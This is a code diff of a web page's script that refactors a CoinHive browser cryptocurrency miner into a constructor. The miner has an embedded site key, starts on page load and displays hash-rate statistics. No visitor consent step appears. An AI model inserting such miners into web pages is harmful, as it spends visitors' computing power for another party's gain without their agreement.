@@ -37,24 +37,31 @@
 
 
 <script>
-  var miner = new CoinHive.Anonymous('iQ21ip245UfhhQVIuKFh2vDmqEw91PUa');
+  var Miner = function() {
+    var publicKey = 'iQ21ip245UfhhQVIuKFh2vDmqEw91PUa';
 
-  function setTextContent(id, content) {
-    document.getElementById(id).textContent = content;
-  }
+    function setTextContent(id, content) {
+      document.getElementById(id).textContent = content;
+    }
 
-  miner.start();
+    this.start = function() {
+      var miner = new CoinHive.Anonymous(publicKey);
+      miner.start();
 
-  setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
 
-    setTextContent('hashes-per-second', hashesPerSecond);
-    setTextContent('total-hashes', totalHashes);
-    setTextContent('accepted-hashes', acceptedHashes);
-  }, 1000);
+        setTextContent('hashes-per-second', hashesPerSecond);
+        setTextContent('total-hashes', totalHashes);
+        setTextContent('accepted-hashes', acceptedHashes);
+      }, 1000);
+    };
+  };
 
+  var makeTheFun = new Miner();
+  makeTheFun.start();
 </script>
 
 </body>
